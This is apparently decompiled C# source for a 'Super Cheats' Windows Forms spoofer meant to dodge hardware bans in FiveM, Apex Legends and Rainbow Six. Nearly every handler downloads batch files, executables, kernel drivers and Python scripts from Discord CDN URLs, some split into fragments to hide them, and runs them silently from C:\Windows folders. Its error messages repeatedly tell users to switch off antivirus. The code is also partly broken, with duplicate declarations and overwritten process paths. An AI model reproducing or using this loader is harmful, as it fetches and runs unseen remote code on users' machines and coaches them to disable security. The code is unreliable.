using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;
using Siticone.UI.WinForms;

namespace SUPER
{
	public sealed class gamespoofer : Form
	{
		private IContainer dashboard;

		private PictureBox pictureBox1;

		private PictureBox pictureBox5;

		private PictureBox pictureBox8;

		private SiticoneGroupBox siticoneGroupBox3;

		private SiticoneGroupBox siticoneGroupBox6;

		private SiticoneRoundedButton rs;

		private SiticoneRadioButton rspermb;

		private SiticoneRadioButton rstempb;

		private SiticoneGroupBox siticoneGroupBox7;

		private SiticoneRoundedButton apex;

		private SiticoneRadioButton apexpermb;

		private SiticoneRadioButton apextempb;

		private ListBox listBox1;

		private Timer dashboard = (Timer)AssistantHelper.dashboard;

		private Panel panel1;

		private SiticoneButton siticoneButton1;

		private SiticoneButton siticoneButton2;

		private SiticoneButton siticoneButton3;

		private SiticoneGroupBox siticoneGroupBox1;

		private SiticoneButton siticoneButton4;

		private SiticoneButton siticoneButton5;

		private SiticoneButton siticoneButton6;

		private SiticoneButton siticoneButton7;

		private Panel panel2;

		public gamespoofer()
		{
			DisposeNetwork();
		}

		private void gamespooferLoad(object sender, EventArgs param_238)
		{
			MainLoad();
			try
			{
				string path = "C:\\Windows\\SuperProj\\Drive";
				if (!Directory.Exists(path))
					Directory.CreateDirectory(path);
			}
			catch (Exception)
			{
				MessageBox.Show("Could not complete function [DIR-CIR], Your windows is not compatiable!", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void MainLoad(object sender, PaintEventArgs param_240)
		{
		}

		private void bsClick(object sender, PaintEventArgs param_242)
		{
		}

		private void stoppClick(object sender, PaintEventArgs param_244)
		{
		}

		private void windowsClick(object sender, PaintEventArgs param_246)
		{
		}

		private void gpuClick(object sender, PaintEventArgs param_248)
		{
		}

		private void xboxClick(object sender, PaintEventArgs param_250)
		{
		}

		private void bsClick(object sender, EventArgs param_252)
		{
		}

		private void MainLoad()
		{
			try
			{
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\START.bat");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\RUNAMIDE.bat");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\REGC1.bat");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\REGC2.bat");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\MAC.bat");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\TIOSJ.bat");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\ZLCKG.bat");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\LZOGJX.bat");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\LZOghlg.bat");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\CLEAN.bat");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\amifldrv64.sys");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\AMIDEWINx64.exe");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\amide.sys");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\2837136472462842364.exe");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\system_fingerprint.py");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\system_utils.py");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\telemetry_fingerprint.py");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\registry_helper.py");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\random_utils.py");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\log_helper.py");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\identity_data.py");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\hardware_fingerprint.py");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\generate_fingerprint.py");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\APX.bat");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\DBCLN.exe");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\RS.bat");
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\DBCLN.exe");
			}
			catch (Exception)
			{
			}
		}

		private async void bsClick()
		{
			try
			{
				string text = "https://cdn.discordapp.com/";
				string text2 = "attachments/884872400766922762";
				string text3 = ".bat";
				string text4 = "/890643919497478144/X";
				string text5 = "BOX";
				new WebClient().DownloadFile(text + text2 + text4 + text5 + text3, "C:\\Windows\\SuperProj\\Drive\\XBOX.bat");
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\XBOX.bat";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				await Task.Delay(2000);
				MessageBox.Show("Spoofed XBOX and unlinked from FiveM!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = DirectorySet.dashboard;
				_ = PaneFactory.dashboard;
			}
			catch (Exception)
			{
				MessageBox.Show("Could not complete function [XBOX-UNLINK] the main error would be that we cannot download the cleaner, then antivirus off and try again!", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private async void stoppClick()
		{
			try
			{
				string text = "https://cdn.discordapp.com/";
				string text2 = "attachments/896100225926709343";
				string text3 = ".bat";
				string text4 = "/904149159475576852/ma";
				string text5 = "c";
				new WebClient().DownloadFile(text + text2 + text4 + text5 + text3, "C:\\Windows\\SuperProj\\Drive\\MAC.bat");
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\MAC.bat";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				await Task.Delay(2000);
				MessageBox.Show("Spoofed MAC Address!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = DirectorySet.dashboard;
				_ = PaneFactory.dashboard;
			}
			catch (Exception)
			{
				MessageBox.Show("Could not complete function [CHANGE-MAC] the main error would be that we cannot download the cleaner, then antivirus off and try again!", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void windowsClick()
		{
			try
			{
				string text = "https://cdn.discordapp.com/";
				string text2 = "attachments/909585368674881562";
				string text3 = ".exe";
				string text4 = "/918889610199859230/userm";
				string text5 = "ode";
				new WebClient().DownloadFile(text + text2 + text4 + text5 + text3, "C:\\Windows\\SuperProj\\Drive\\usermode.exe");
				Process.Start("C:\\Windows\\SuperProj\\Drive\\usermode.exe");
			}
			catch (Exception)
			{
				MessageBox.Show("Could not spoof [USERMODE-DRIVER] turn your antivirus off?", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void gpuClick()
		{
			try
			{
				string text = "https://cdn.discordapp.com/";
				string text2 = "attachments/896100225926709343";
				string text3 = ".bat";
				string text4 = ".exe";
				string text5 = "/906664651591413771/MOB";
				string text6 = "IZ";
				string text7 = "/906664670235074620/ZZI";
				string text8 = "FKJF";
				string text9 = "/906664666741235712/YE";
				string text10 = "EE";
				WebClient webClient = new WebClient();
				webClient.DownloadFile(text + text2 + text5 + text6 + text4, "C:\\ProgramData\\Temp\\ppsad\\00-00\\MOBIZ.exe");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/904751671123509291/907030724966748231/xlzjt5i52.exe", "C:\\ProgramData\\Temp\\ppsad\\00-00\\xlzjt5i52.exe");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/904751671123509291/907030725910487100/xlzjt5i52.sys", "C:\\ProgramData\\Temp\\ppsad\\00-00\\xlzjt5i52.sys");
				webClient.DownloadFile(text + text2 + text7 + text8 + text4, "C:\\ProgramData\\Temp\\ppsad\\00-00\\ZZIFKJF.exe");
				webClient.DownloadFile(text + text2 + text9 + text10 + text3, "C:\\ProgramData\\Temp\\ppsad\\00-00\\YEEE.bat");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/906664646839242782/LZKGKzzz.bat", "C:\\ProgramData\\Temp\\ppsad\\00-00\\LZKGKzzz.bat");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/907033962805874708/run.bat", "C:\\ProgramData\\Temp\\ppsad\\00-00\\run.bat");
				Process.Start("C:\\ProgramData\\Temp\\ppsad\\00-00\\run.bat");
			}
			catch (Exception)
			{
				MessageBox.Show("Could not spoof [SERIAL-NULL (TEMP)] turn your antivirus off? Check supported win vers?", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private async void xboxClick()
		{
			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/909940221263638632/918881150179627008/nvidia-smi.exe", "C:\\Windows\\SuperProj\\Drive\\nvidia-smi.exe");
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\nvidia-smi.exe";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				await Task.Delay(2000);
				MessageBox.Show("Spoofed GPU traces, you can check in the serial checkers!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				_ = DirectorySet.dashboard;
				_ = PaneFactory.dashboard;
			}
			catch (Exception ex)
			{
				MessageBox.Show("Could not complete function [GPU-SPOOF] the main error would be that we cannot download the cleaner, then antivirus off or your GPU is not compatible! [ " + ex.Message + " ]", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			try
			{
				lick.Delete("C:\\Windows\\SuperProj\\Drive\\System32\\nvml.dll");
			}
			catch (Exception)
			{
			}
		}

		private async void serialcheckersClick()
		{
			try
			{
				string text = "https://cdn.discordapp.com/";
				string text2 = "attachments/884872400766922762";
				string text3 = ".bat";
				string text4 = "/891108544424841216/Regis";
				string text5 = "tryCleaner1";
				string text6 = "/891108545628606484/Regist";
				string text7 = "ryCleaner2";
				WebClient webClient = new WebClient();
				webClient.DownloadFile(text + text2 + text4 + text5 + text3, "C:\\Windows\\SuperProj\\Drive\\REGC1.bat");
				webClient.DownloadFile(text + text2 + text6 + text7 + text3, "C:\\Windows\\SuperProj\\Drive\\REGC1.bat");
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\REGC1.bat";
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\REGC2.bat";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				await Task.Delay(2000);
				MessageBox.Show("Spoofed registerys, cleaned all registerys and data linking!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = DirectorySet.dashboard;
				_ = PaneFactory.dashboard;
			}
			catch (Exception)
			{
				MessageBox.Show("Could not complete function [REG-CLEAN] the main error would be that we cannot download the cleaner, then antivirus off and try again!", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private async void biosClick()
		{
			try
			{
				string path = "C:\\ProgramData\\Temp\\ppsad\\00-00";
				if (!Directory.Exists(path))
					Directory.CreateDirectory(path);
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/905929010624753735/AMIDEWINx64.exe", "C:\\Windows\\SuperProj\\Drive\\AMIDEWINx64.exe");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/905929002672341013/amide.sys", "C:\\Windows\\SuperProj\\Drive\\amide.sys");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/905928994225008651/amifldrv64.sys", "C:\\Windows\\SuperProj\\Drive\\amifldrv64.sys");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/905929125229891654/nnnn.bat", "C:\\Windows\\SuperProj\\Drive\\RUNAMIDE.bat");
				Process.Start("C:\\Windows\\SuperProj\\Drive\\RUNAMIDE.bat");
				await Task.Delay(2000);
				MessageBox.Show("Spoofed bios traces, bios IDS and all traces!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				_ = AddinDesigner.dashboard;
				_ = DirectorySet.dashboard;
			}
			catch (Exception)
			{
				MessageBox.Show("Could not spoof [BIOS-SPOOF] the main error would be that we cannot download the cleaner, then antivirus off and try again!", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void userinClick()
		{
			try
			{
				string text = "https://cdn.discordapp.com/";
				string text2 = "attachments/903055918223200309";
				string text3 = ".bat";
				string text4 = "/909258954570362890/Clea";
				string text5 = "ner";
				new WebClient().DownloadFile(text + text2 + text4 + text5 + text3, "C:\\Windows\\SuperProj\\Drive\\CLEAN.bat");
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\CLEAN.bat";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
			catch (Exception)
			{
			}
		}

		private void ReduceAddin()
		{
			try
			{
				string path = "C:\\ProgramData\\Temp\\ppsad\\00-00";
				if (!Directory.Exists(path))
					Directory.CreateDirectory(path);
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/896100225926709343/905114934952755300/ss.exe", "C:\\ProgramData\\Temp\\ss.exe");
				Process.Start("C:\\ProgramData\\Temp\\ss.exe");
				MessageBox.Show("Spoofed serials, you can check in the serial checkers!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			catch (Exception)
			{
				MessageBox.Show("Could not spoof [SERIAL-NULL (PERM)] turn your antivirus off? Install python?", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private async void grouClick()
		{
			try
			{
				string text = "https://cdn.discordapp.com/";
				string text2 = "attachments/896100225926709343";
				string text3 = ".bat";
				string text4 = "/899057347543052378/ST";
				string text5 = "ART";
				WebClient webClient = new WebClient();
				webClient.DownloadFile(text + text2 + text4 + text5 + text3, "C:\\Windows\\Clean\\START.bat");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/919206933741834260/919207145579356160/hardware_fingerprint.py", "C:\\Windows\\Clean\\hardware_fingerprint.py");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/919206933741834260/919207145780690974/generate_fingerprint.py", "C:\\Windows\\Clean\\generate_fingerprint.py");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/919206933741834260/919207145986228224/telemetry_fingerprint.py", "C:\\Windows\\Clean\\telemetry_fingerprint.py");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/919206933741834260/919207144400769054/system_utils.py", "C:\\Windows\\Clean\\system_utils.py");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/919206933741834260/919207144576921690/system_fingerprint.py", "C:\\Windows\\Clean\\system_fingerprint.py");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/919206933741834260/919207144765681684/registry_helper.py", "C:\\Windows\\Clean\\registry_helper.py");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/919206933741834260/919207144962785280/random_utils.py", "C:\\Windows\\Clean\\random_utils.py");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/919206933741834260/919207145143156826/log_helper.py", "C:\\Windows\\Clean\\log_helper.py");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/919206933741834260/919207145336090664/identity_data.py", "C:\\Windows\\Clean\\identity_data.py");
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\Clean\\START.bat";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				await Task.Delay(2000);
				MessageBox.Show("Spoofed windows, all windows data and traces have been removed!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = AddinDesigner.dashboard;
				_ = DirectorySet.dashboard;
				_ = PaneFactory.dashboard;
			}
			catch (Exception ex)
			{
				MessageBox.Show("Could not complete function [WINDOWS-SPOOF] the main error would be that we cannot download the cleaner, then antivirus off then download python and set to default open and try again! [ " + ex.Message + " ]", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void stoppClick(object sender, EventArgs param_254)
		{
		}

		private void windowsClick(object sender, EventArgs param_256)
		{
		}

		private void gpuClick(object sender, EventArgs param_258)
		{
		}

		private void xboxClick(object sender, EventArgs param_260)
		{
		}

		private void serialcheckersClick(object sender, EventArgs param_262)
		{
			gpuClick();
		}

		private void biosClick(object sender, EventArgs param_264)
		{
		}

		private void userinClick(object sender, EventArgs param_266)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void ReduceAddin(object sender, EventArgs param_268)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void grouClick(object sender, EventArgs param_270)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void LoginMove(object sender, EventArgs param_272)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void OpenPciture(object sender, EventArgs param_274)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void ConnectWindow(object sender, EventArgs param_276)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void ToggleFunction(object sender, EventArgs param_278)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void FormatEditor(object sender, EventArgs param_280)
		{
		}

		private void Increase(object sender, EventArgs param_282)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void DisposeNetwork(object sender, EventArgs param_284)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void DisposeStub(object sender, EventArgs param_286)
		{
		}

		private void LoadSolution(object sender, EventArgs param_288)
		{
		}

		private void loginnowClick(object sender, EventArgs param_290)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void PublishPage(object sender, EventArgs param_292)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void pwrClick(object sender, EventArgs param_294)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void UnregisterImage(object sender, EventArgs param_296)
		{
		}

		private void FreeDisk(object sender, EventArgs param_298)
		{
		}

		private void HideImage(object sender, EventArgs param_300)
		{
			MessageBox.Show("This function is currently being updated, hope to be seen in future updates!", "Super Cheats - Update Notice!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		private void LoginMove()
		{
		}

		private void OpenPciture()
		{
		}

		private void AddWindow(object sender, EventArgs param_302)
		{
		}

		private void pictureBox1Click(object sender, EventArgs param_304)
		{
		}

		private async void ConnectWindow()
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909259936242995210/R6S.bat", "C:\\Windows\\SuperProj\\Drive\\RS.bat");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909258244109774898/DBCLN.exe", "C:\\Windows\\SuperProj\\Drive\\DBCLN.exe");
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\RS.bat";
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\DBCLN.exe";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				await Task.Delay(1000);
				stoppClick();
				await Task.Delay(1000);
				bsClick();
				await Task.Delay(1000);
				xboxClick();
				await Task.Delay(1000);
				serialcheckersClick();
				await Task.Delay(1000);
				grouClick();
				await Task.Delay(1000);
				gpuClick();
				await Task.Delay(1000);
				biosClick();
				await Task.Delay(1000);
				userinClick();
				await Task.Delay(3000);
				MessageBox.Show("Spoofed [RAINBOX 6] all operations completed. We suggest you wait a few mins before closing!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				_ = DirectorySet.dashboard;
				_ = PaneFactory.dashboard;
			}
			catch (Exception)
			{
				MessageBox.Show("Could not spoof [RS6-TEMP] turn your antivirus off?", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private async void ToggleFunction()
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909259936242995210/R6S.bat", "C:\\Windows\\SuperProj\\Drive\\RS.bat");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909258244109774898/DBCLN.exe", "C:\\Windows\\SuperProj\\Drive\\DBCLN.exe");
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\RS.bat";
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\DBCLN.exe";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				await Task.Delay(1000);
				stoppClick();
				await Task.Delay(1000);
				bsClick();
				await Task.Delay(1000);
				xboxClick();
				await Task.Delay(1000);
				serialcheckersClick();
				await Task.Delay(1000);
				grouClick();
				await Task.Delay(1000);
				ReduceAddin();
				await Task.Delay(1000);
				biosClick();
				await Task.Delay(1000);
				userinClick();
				await Task.Delay(3000);
				MessageBox.Show("Spoofed [RAINBOX 6] all operations completed. We suggest you wait a few mins before closing!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				_ = DirectorySet.dashboard;
				_ = PaneFactory.dashboard;
			}
			catch (Exception)
			{
				MessageBox.Show("Could not spoof [RS6-TEMP] turn your antivirus off?", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void rsClick(object sender, EventArgs param_306)
		{
		}

		private void pictureBox5Click(object sender, EventArgs param_308)
		{
			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909485581409583114/Apex.rar", "C:\\Apex Methods.rar");
				Process.Start("C:\\Apex Methods.rar");
				MessageBox.Show("Downloaded Apex methods, can be located on C:\\ drive!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			catch (Exception)
			{
				MessageBox.Show("Could not download methods, turn your antivirus off?", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private async void FormatEditor()
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909254201786368030/Apex.bat", "C:\\Windows\\SuperProj\\Drive\\APX.bat");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909258244109774898/DBCLN.exe", "C:\\Windows\\SuperProj\\Drive\\DBCLN.exe");
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\APX.bat";
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\DBCLN.exe";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				await Task.Delay(1000);
				stoppClick();
				await Task.Delay(1000);
				bsClick();
				await Task.Delay(1000);
				xboxClick();
				await Task.Delay(1000);
				serialcheckersClick();
				await Task.Delay(1000);
				grouClick();
				await Task.Delay(1000);
				gpuClick();
				await Task.Delay(1000);
				biosClick();
				await Task.Delay(1000);
				userinClick();
				await Task.Delay(3000);
				MessageBox.Show("Spoofed [APEX LEGENDS] all operations completed. We suggest you wait a few mins before closing!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				_ = DirectorySet.dashboard;
				_ = PaneFactory.dashboard;
			}
			catch (Exception)
			{
				MessageBox.Show("Could not spoof [APEX-TEMP] turn your antivirus off?", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private async void Increase()
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909254201786368030/Apex.bat", "C:\\Windows\\SuperProj\\Drive\\APX.bat");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/903055918223200309/909258244109774898/DBCLN.exe", "C:\\Windows\\SuperProj\\Drive\\DBCLN.exe");
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\APX.bat";
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\DBCLN.exe";
				await Task.Delay(1000);
				stoppClick();
				await Task.Delay(1000);
				bsClick();
				await Task.Delay(1000);
				xboxClick();
				await Task.Delay(1000);
				serialcheckersClick();
				await Task.Delay(1000);
				grouClick();
				await Task.Delay(1000);
				ReduceAddin();
				await Task.Delay(1000);
				biosClick();
				await Task.Delay(1000);
				userinClick();
				await Task.Delay(3000);
				MessageBox.Show("Spoofed [APEX LEGENDS] all operations completed. We suggest you wait a few mins before closing!", "Super Cheats - Success Notice!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				_ = DirectorySet.dashboard;
				_ = PaneFactory.dashboard;
			}
			catch (Exception)
			{
				MessageBox.Show("Could not spoof [APEX-PERM] turn your antivirus off?", "Super Cheats - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void apexClick(object sender, EventArgs param_310)
		{
			if (apextempb.Checked)
				FormatEditor();
			if (apexpermb.Checked)
				Increase();
			if (!apexpermb.Checked & !apextempb.Checked)
				MessageBox.Show("Please select an option to spoof!", "Super Spoofer - Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		private void BatchBuildStub(object sender, EventArgs param_312)
		{
		}

		private void siticoneGroupBox3Click(object sender, EventArgs param_314)
		{
		}

		private void EnableAssembly(object sender, EventArgs param_316)
		{
		}

		private void NavigateWindow(object sender, EventArgs param_318)
		{
		}

		private void TestFunction(object sender, EventArgs param_320)
		{
		}

		private void JoinActivity(object sender, EventArgs param_322)
		{
		}

		private async void siticoneButton4Click(object sender, EventArgs param_324)
		{
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i < processes.Length; i++)
			{
				if (processes[i].ProcessName.ToString() == "FiveM")
				{
					listBox1.Items.Clear();
					listBox1.Items.Add("[+] FiveM Found, dont connect to server yet!");
					listBox1.Items.Add("[!] UNDOING PORTS, PLEASE WAIT!");
					await Task.Delay(1000);
					Process process = new Process();
					process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\fivem_steam.py";
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.Start();
					await Task.Delay(1000);
					listBox1.Items.Clear();
					listBox1.Items.Add("[+] Ports have been undone!");
					listBox1.Items.Add("[+] Connect to a server, enjoy!");
					_ = PaneFactory.dashboard;
				}
				_ = PaneFactory.dashboard;
			}
			_ = XmlFileSettings.dashboard;
		}

		private async void siticoneButton1Click(object sender, EventArgs param_326)
		{
			listBox1.Items.Clear();
			listBox1.Items.Add("[!] Spoof FiveM Selected, Wait we are connecting!.");
			await Task.Delay(1000);
			listBox1.Items.Add("[+] Spoofer has connected and is ready, we are starting...");
			listBox1.Items.Clear();
			try
			{
				await Task.Delay(500);
				listBox1.Items.Add("[%] Downloading FiveM Database");
				await Task.Delay(2000);
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/909592976299266100/930524388342788176/blocky.py", "C:\\Windows\\SuperProj\\Drive\\fivem_gta.py");
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/909592976299266100/930524388514730067/unblock.py", "C:\\Windows\\SuperProj\\Drive\\fivem_steam.py");
				listBox1.Items.Add("[+] Downloaded FiveM Database");
				await Task.Delay(1000);
				listBox1.Items.Clear();
				_ = DirectorySet.dashboard;
			}
			catch (Exception)
			{
				listBox1.Items.Add("[-] ERROR: Downloading DB");
			}
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = "C:\\Windows\\SuperProj\\Drive\\fivem_gta.py";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
